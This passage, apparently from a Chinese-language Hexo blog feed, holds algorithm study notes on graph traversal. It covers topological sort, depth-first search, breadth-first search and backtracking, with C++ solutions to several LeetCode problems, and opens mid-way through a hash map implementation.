(*it).second;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">remove</span><span class="params">(<span class="type">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> h=<span class="built_in">hash</span>(key);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> it=data[h].<span class="built_in">begin</span>();it!=data[h].<span class="built_in">end</span>();++it)&#123;</span><br><span class="line">            <span class="keyword">if</span>((*it).first==key)&#123;</span><br><span class="line">                data[h].<span class="built_in">erase</span>(it);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1>多重集合(multiset)</h1>
<h1>参考</h1>
<p><a href="https://mp.weixin.qq.com/s/CySTVqEDK9-K1MRUwBKRCg">面经手册 · 第3篇《HashMap核心知识，扰动函数、负载因子、扩容链表拆分深度学习(+实践验证)》 (qq.com)</a></p>
]]></content>
  </entry>
  <entry>
    <title>DFS、BFS</title>
    <url>/2023/02/28/%E7%AE%97%E6%B3%95/%E5%9B%BE%EF%BC%9A%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F%E3%80%81DFS%E3%80%81BFS/</url>
    <content><![CDATA[<blockquote>
<p>数据结构：二叉树，图，二维矩阵</p>
</blockquote>
<h1>图的遍历</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>深度优先搜索（DFS）</p>
<p>检查图的连通性和无环性、<mark>关节点</mark></p>
</li>
<li class="lvl-2">
<p>广度优先搜索（BFS）</p>
<p>检查图的连通性和无环性、求两个给定顶点间 <mark>边的数量</mark> 最少的路径</p>
</li>
</ul>
<h1>图的存储</h1>
<h4 id="邻接矩阵">邻接矩阵</h4>
<p>适合于边稠密图</p>
<h4 id="邻接表">邻接表</h4>
<p>适用于边数较少的稀疏图</p>
<h1>拓扑排序</h1>
<blockquote>
<p>有向无环图（DAG，directed acyclic graph）</p>
<p>拓扑排序：对于图 <em>G</em> 中的任意一条有向边 (<em>u</em>,<em>v</em>)，<em>u</em> 在排列中都出现在 <em>v</em> 的前面。</p>
<p>m个顶点，n条边，时间复杂度O(m+n)<br>
邻接矩阵邻接表：时间复杂度O(n+e)</p>
</blockquote>
<h2 id="算法步骤">算法步骤</h2>
<blockquote>
<ul class="lvl-1">
<li class="lvl-2">
<p>搜索入度为零的顶点，加入队列</p>
</li>
<li class="lvl-2">
<p>当队列不空时</p>
<ul class="lvl-3">
<li class="lvl-4">取队首元素u，加入答案</li>
<li class="lvl-4">将u的相邻顶点入度减1，若减为0，加入队列</li>
</ul>
</li>
<li class="lvl-2">
<p>若答案包括n个顶点，得到拓扑排序，否则有环</p>
</li>
</ul>
</blockquote>
<h4 id="210-课程表-II"><a href="https://leetcode.cn/problems/course-schedule-ii/">210. 课程表 II</a></h4>
<blockquote>
<p>现在你总共有 numCourses 门课需要选，记为 0 到 numCourses - 1。给你一个数组 prerequisites ，其中 prerequisites[i] = [ai, bi] ，表示在选修课程 ai 前 必须 先选修 bi 。</p>
<p>例如，想要学习课程 0 ，你需要先完成课程 1 ，我们用一个匹配来表示：[0,1] 。返回你为了学完所有课程所安排的学习顺序。可能会有多个正确的顺序，你只要返回 任意一种 就可以了。如果不可能完成所有课程，返回 一个空数组 。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// 存储有向图</span></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; edges;</span><br><span class="line">    <span class="comment">// 存储每个节点的入度</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; indeg;</span><br><span class="line">    <span class="comment">// 存储答案</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; result;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">findOrder</span><span class="params">(<span class="type">int</span> numCourses, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; prerequisites)</span> </span>&#123;</span><br><span class="line">        edges.<span class="built_in">resize</span>(numCourses);</span><br><span class="line">        indeg.<span class="built_in">resize</span>(numCourses);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; info: prerequisites) &#123;</span><br><span class="line">            edges[info[<span class="number">1</span>]].<span class="built_in">push_back</span>(info[<span class="number">0</span>]);</span><br><span class="line">            ++indeg[info[<span class="number">0</span>]];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">        <span class="comment">// 将所有入度为 0 的节点放入队列中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numCourses; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (indeg[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                q.<span class="built_in">push</span>(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="comment">// 从队首取出一个节点</span></span><br><span class="line">            <span class="type">int</span> u = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="comment">// 放入答案中</span></span><br><span class="line">            result.<span class="built_in">push_back</span>(u);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> v: edges[u]) &#123;</span><br><span class="line">                --indeg[v];</span><br><span class="line">                <span class="comment">// 如果相邻节点 v 的入度为 0，就可以选 v 对应的课程了</span></span><br><span class="line">                <span class="keyword">if</span> (indeg[v] == <span class="number">0</span>) &#123;</span><br><span class="line">                    q.<span class="built_in">push</span>(v);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result.<span class="built_in">size</span>() != numCourses) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>访问标记设置：可以通过额外的访问标记数组进行记录，或者通过修改原数组数值表明已经访问过</p>
<h1>深度优先搜索</h1>
<blockquote>
<p>深度优先搜索（depth-first search, DFS）在搜索到一个新的节点时，立即堆该新节点进行遍历；深度优先搜索用<mark>先入后出的栈</mark>来实现，也可以通过递归实现。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//采用邻接表存储，递归实现</span></span><br><span class="line"><span class="built_in">DFS</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; g,vector&lt;<span class="type">bool</span>&gt;&amp; visited,<span class="type">int</span> cur)&#123;</span><br><span class="line">    <span class="keyword">if</span>(visited[cur])&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    visited[cur]=<span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> &amp;next:g[cur])&#123;</span><br><span class="line">        <span class="built_in">DFS</span>(g,visited,next);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="695-岛屿的最大面积"><a href="https://leetcode.cn/problems/max-area-of-island/">695. 岛屿的最大面积</a></h3>
<p>递归写法：先判断是否满足条件，再进行递归，可以在访问节点时设置访问标记</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> area=<span class="number">0</span>;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; direction=&#123;<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="type">int</span> m,n;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxAreaOfIsland</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;m=grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">this</span>-&gt;n=grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(grid[i][j])&#123;</span><br><span class="line">                    area=<span class="built_in">max</span>(area,<span class="built_in">DFS</span>(grid,i,j));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> area;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">DFS</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid,<span class="type">int</span> i,<span class="type">int</span> j)</span></span>&#123;</span><br><span class="line">        grid[i][j]=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> cnt=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;<span class="number">4</span>;k++)&#123;</span><br><span class="line">            <span class="type">int</span> x=i+direction[k],y=j+direction[k<span class="number">+1</span>];</span><br><span class="line">            <span class="keyword">if</span>(x&gt;=<span class="number">0</span>&amp;&amp;x&lt;m&amp;&amp;y&gt;=<span class="number">0</span>&amp;&amp;y&lt;n&amp;&amp;grid[x][y]==<span class="number">1</span>)&#123;          </span><br><span class="line">                cnt+=<span class="built_in">DFS</span>(grid,x,y);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cnt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>栈实现</p>
<blockquote>
<p>在入队时设置访问标记，如果出队时设置访问标记，可能导致多次入队，2、3出队列时分别导致4进入队列。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202305251704677.png" alt="image-20230525170426579"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> area=<span class="number">0</span>;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; direction=&#123;<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="type">int</span> m,n;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxAreaOfIsland</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;m=grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">this</span>-&gt;n=grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(grid[i][j])&#123;</span><br><span class="line">                    <span class="type">int</span> local=<span class="number">1</span>;</span><br><span class="line">                    queue&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt; qu;</span><br><span class="line">                    grid[i][j]=<span class="number">0</span>;</span><br><span class="line">                    qu.<span class="built_in">push</span>(&#123;i,j&#125;);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span>(!qu.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                        <span class="keyword">auto</span> [x,y]=qu.<span class="built_in">front</span>();</span><br><span class="line">                        <span class="comment">// grid[x][y]=0;</span></span><br><span class="line">                        qu.<span class="built_in">pop</span>();</span><br><span class="line">                        <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;<span class="number">4</span>;k++)&#123;</span><br><span class="line">                            <span class="type">int</span> r=x+direction[k],c=y+direction[k<span class="number">+1</span>];</span><br><span class="line">                            <span class="keyword">if</span>(r&gt;=<span class="number">0</span>&amp;&amp;r&lt;m&amp;&amp;c&gt;=<span class="number">0</span>&amp;&amp;c&lt;n&amp;&amp;grid[r][c]==<span class="number">1</span>)&#123;</span><br><span class="line">                                ++local;</span><br><span class="line">                                grid[r][c]=<span class="number">0</span>;</span><br><span class="line">                                qu.<span class="built_in">push</span>(&#123;r,c&#125;);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    area=<span class="built_in">max</span>(area,local);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> area;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1>广度优先搜索</h1>
<blockquote>
<p>广度优先搜索(breadth-first search,BFS)逐层进行遍历，使用<mark>先入先出的队列</mark>进行遍历。可用于处理<mark>无权最短路径</mark>。</p>
</blockquote>
<blockquote>
<ul class="lvl-1">
<li class="lvl-2">
<p>初始化：根元素入队，设置访问标记</p>
</li>
<li class="lvl-2">
<p>当队列不为空的时候</p>
<ul class="lvl-3">
<li class="lvl-4">求队列长度$s_i$</li>
<li class="lvl-4">从队列中取$s_i$个元素，进行下一轮扩展
<ul class="lvl-5">
<li class="lvl-6">节点未被访问过，节点入队，设置访问标记</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//邻接表存储</span></span><br><span class="line"><span class="built_in">BFS</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; g)&#123;</span><br><span class="line">    <span class="type">int</span> n=g.<span class="built_in">size</span>();</span><br><span class="line">    <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visited</span><span class="params">(n)</span></span>;</span><br><span class="line">    </span><br><span class="line">    queue&lt;<span class="type">int</span>&gt; qu;</span><br><span class="line">    qu.<span class="built_in">push</span>(<span class="number">0</span>);</span><br><span class="line">    visited[<span class="number">0</span>]=<span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(!qu.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="type">int</span> cur=qu.<span class="built_in">front</span>();</span><br><span class="line">        qu.<span class="built_in">pop</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> next:g[cur])&#123;</span><br><span class="line">            <span class="keyword">if</span>(!visited[next])&#123;</span><br><span class="line">                visited[next]=<span class="literal">true</span>;</span><br><span class="line">                qu.<span class="built_in">push</span>(next);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>$$<br>
时间复杂度：O(n+m)，其中n为定点数，m为边数\<br>
空间复杂度：O(n)，队列开销<br>
$$</p>
<h1>回溯</h1>
<blockquote>
<p>回溯法(backtracking)是优先搜索的一种特殊情况，常用于需要记录节点状态的深度优先搜索。排列、组合、选择类问题使用回溯法。回溯法可以对图的总状态进行修改，而非每次遍历时新建一个图来储存状态。</p>
<p>深度优先搜索：[修改当前节点状态]-&gt;[递归子节点]</p>
<p>回溯：[修改当前节点状态]-&gt;[递归子节点]-&gt;[回改当前节点状态]</p>
<ul class="lvl-1">
<li class="lvl-2">
<p>选择k个数字构成一个排列</p>
</li>
<li class="lvl-2">
<p>选择若干数字组成一个目标和target</p>
</li>
<li class="lvl-2">
<p>对全部数字进行排列</p>
</li>
</ul>
</blockquote>
<p><a href="https://leetcode.cn/problems/subsets/">78. 子集</a></p>
<p>方法一：回溯</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; ans;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">subsets</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; subset;</span><br><span class="line">        <span class="built_in">backtrack</span>(nums,subset,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">backtrack</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, vector&lt;<span class="type">int</span>&gt;&amp;subset, <span class="type">int</span> start)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(start==nums.<span class="built_in">size</span>())&#123;</span><br><span class="line">            ans.<span class="built_in">push_back</span>(subset);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        subset.<span class="built_in">push_back</span>(nums[start]);</span><br><span class="line">        <span class="built_in">backtrack</span>(nums,subset,start<span class="number">+1</span>);</span><br><span class="line">        subset.<span class="built_in">pop_back</span>();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">backtrack</span>(nums,subset,start<span class="number">+1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//当前是否必须要选择一个数</span></span><br><span class="line">        <span class="comment">// for(int i=start;i&lt;nums.size();i++)&#123;</span></span><br><span class="line">        <span class="comment">//     subset.push_back(nums[i]);</span></span><br><span class="line">        <span class="comment">//     backtrack(nums,subset,i+1);</span></span><br><span class="line">        <span class="comment">//     subset.pop_back();</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>方法二：位枚举</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">subsets</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; ans;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; tmp;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;(<span class="number">1</span>&lt;&lt;n);i++)&#123;</span><br><span class="line">            tmp.<span class="built_in">clear</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> pos=<span class="number">0</span>;pos&lt;n;pos++)&#123;</span><br><span class="line">                <span class="keyword">if</span>((i&gt;&gt;pos)&amp;<span class="number">1</span>)</span><br><span class="line">                    tmp.<span class="built_in">push_back</span>(nums[pos]);</span><br><span class="line">            &#125;</span><br><span class="line">            ans.<span class="built_in">push_back</span>(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="47-全排列-II"><a href="https://leetcode.cn/problems/permutations-ii/">47. 全排列 II</a></h4>
<blockquote>
<p>给定一个可包含重复数字的序列 <code>nums</code> ，<em><strong>按任意顺序</strong></em> 返回所有不重复的全排列。</p>
</blockquote>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">对于重复的数字要保证在结果中的相对位置一致</span><br><span class="line"><span class="section"># 对于降重的处理</span></span><br><span class="line">!visited[i-1]</span><br><span class="line">在寻找index位置数字时，因为回溯会把visited[i-1]修改为0</span><br><span class="line">visited[i]便不会被填到index的位置</span><br><span class="line">而在寻找index+1位置时，由于visited[i-1]为1，则索引为i的数字被填到这一位置</span><br><span class="line">寻找顺序位置，前一个相同数字填入过，则继续填入</span><br><span class="line"><span class="section">## visited[i]</span></span><br><span class="line">寻找逆序位置，前一个相同数字没有填入过，则继续填入</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; ret;</span><br><span class="line">    vector&lt;<span class="type">bool</span>&gt; visited;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">permuteUnique</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        visited.<span class="built_in">resize</span>(nums.<span class="built_in">size</span>(),<span class="literal">false</span>);</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; tmp;</span><br><span class="line">        <span class="built_in">backtracking</span>(<span class="number">0</span>,tmp,nums);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">backtracking</span><span class="params">(<span class="type">int</span> index,vector&lt;<span class="type">int</span>&gt; &amp;tmp,vector&lt;<span class="type">int</span>&gt; &amp;nums)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index==nums.<span class="built_in">size</span>())&#123;</span><br><span class="line">            ret.<span class="built_in">push_back</span>(tmp);</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;****&quot;</span>&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 寻找可以填入下标Index的数字</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visited[i]||(i&gt;<span class="number">0</span>&amp;&amp;nums[i]==nums[i<span class="number">-1</span>]&amp;&amp;!visited[i<span class="number">-1</span>]))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;index:&quot;</span>&lt;&lt;index&lt;&lt;<span class="string">&quot; i:&quot;</span>&lt;&lt;i&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> vis:visited)</span><br><span class="line">                cout&lt;&lt;vis&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">            cout&lt;&lt;endl;</span><br><span class="line">            visited[i]=<span class="literal">true</span>;</span><br><span class="line">            tmp.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">            <span class="built_in">backtracking</span>(index<span class="number">+1</span>,tmp,nums);</span><br><span class="line">            tmp.<span class="built_in">pop_back</span>();</span><br><span class="line">            visited[i]=<span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="934-最短的桥"><a href="https://leetcode.cn/problems/shortest-bridge/">934. 最短的桥</a></h2>
<blockquote>
<p>在给定的二维二进制数组 A 中，存在两座岛。（岛是由四面相连的 1 形成的一个最大组。）</p>
<p>现在，我们可以将 0 变为 1，以使两座岛连接起来，变成一座岛。</p>
<p>返回必须翻转的 0 的最小数目。（可以保证答案至少是 1 。）</p>
</blockquote>
<p>广度优先搜索从一个岛屿出发不断扩展一圈，何时可以找到另外一个岛屿。前提如何保障找到扩展相应第一步时的相应初始位置。</p>
<p>初始时找到一个岛屿的一个点，不断向外扩展，每一层可以找到从这一点向外n步时可以到达的位置。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="type">int</span> m;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; direction=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">shortestBridge</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        m=grid.<span class="built_in">size</span>();</span><br><span class="line">        n=grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        queue&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt; q;</span><br><span class="line">        <span class="type">bool</span> flag=<span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(flag)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(grid[i][j]==<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="built_in">DFS</span>(grid,q,i,j);</span><br><span class="line">                    flag=<span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> layer=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            layer++;</span><br><span class="line">            <span class="type">int</span> cnt=q.<span class="built_in">size</span>();</span><br><span class="line">            <span class="comment">// cout&lt;&lt;&quot;cnt:&quot;&lt;&lt;cnt&lt;&lt;endl;</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;cnt;i++)&#123;</span><br><span class="line">                <span class="keyword">auto</span> [x,y]=q.<span class="built_in">front</span>();</span><br><span class="line">                <span class="comment">// cout&lt;&lt;x&lt;&lt;&quot;,&quot;&lt;&lt;y&lt;&lt;endl;</span></span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;<span class="number">4</span>;k++)&#123;</span><br><span class="line">                    <span class="type">int</span> a=x+direction[k],b=y+direction[k<span class="number">+1</span>];</span><br><span class="line">                    <span class="keyword">if</span>(a&gt;=<span class="number">0</span>&amp;&amp;a&lt;m&amp;&amp;b&gt;=<span class="number">0</span>&amp;&amp;b&lt;n)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(grid[a][b]==<span class="number">2</span>)</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                    <span class="keyword">if</span>(grid[a][b]==<span class="number">1</span>)&#123;</span><br><span class="line">                            <span class="comment">// cout&lt;&lt;&quot;*******&quot;&lt;&lt;endl;</span></span><br><span class="line">                             <span class="keyword">return</span> layer;</span><br><span class="line">                        &#125;</span><br><span class="line">                            grid[a][b]=<span class="number">2</span>;</span><br><span class="line">                            q.<span class="built_in">push</span>(&#123;a,b&#125;);</span><br><span class="line">                           </span><br><span class="line">                        </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">DFS</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;grid,queue&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt; &amp;q,<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;<span class="number">0</span>||x&gt;=m||y&lt;<span class="number">0</span>||y&gt;=n||grid[x][y]==<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(grid[x][y]==<span class="number">0</span>)&#123;</span><br><span class="line">            q.<span class="built_in">push</span>(&#123;x,y&#125;);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        grid[x][y]=<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;<span class="number">4</span>;k++)&#123;</span><br><span class="line">            <span class="type">int</span> i=x+direction[k],j=y+direction[k<span class="number">+1</span>];</span><br><span class="line">            <span class="built_in">DFS</span>(grid,q,i,j);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
